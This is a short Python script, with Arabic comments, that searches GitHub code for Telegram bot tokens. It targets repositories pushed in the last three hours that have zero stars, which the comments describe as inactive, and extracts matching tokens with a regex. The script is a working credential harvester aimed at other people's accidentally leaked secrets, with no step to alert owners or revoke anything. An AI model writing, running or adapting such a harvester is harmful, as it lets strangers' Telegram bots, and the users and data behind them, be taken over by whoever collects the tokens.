import re
import os
import datetime
from github import Github

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token: return []
    g = Github(token)
    found_tokens = []
    
    # البحث في المستودعات الجديدة جداً (آخر 3 ساعات) 
    # وبشرط أن تكون خاملة (0 نجوم)
    three_hours_ago = (datetime.datetime.utcnow() - datetime.timedelta(hours=3)).isoformat()
    
    # هنا التركيز على عدم وجود نجوم (stars:0)
    queries = [
        f'bot_token pushed:>{three_hours_ago} stars:0',
        f'telebot pushed:>{three_hours_ago} stars:0',
        f'telegram_token pushed:>{three_hours_ago} stars:0'
    ]
    
    for query in queries:
        try:
            # البحث في الكود وترتيبه حسب الأحدث
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            for file in results[:10]:
                try:
                    content = file.decoded_content.decode('utf-8')
                    # نمط ريجكس دقيق
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        # إضافة التوكن فقط إذا كان جديداً
                        if token not in found_tokens:
                            found_tokens.append(token)
                except: continue
        except Exception: continue
            
    return found_tokens
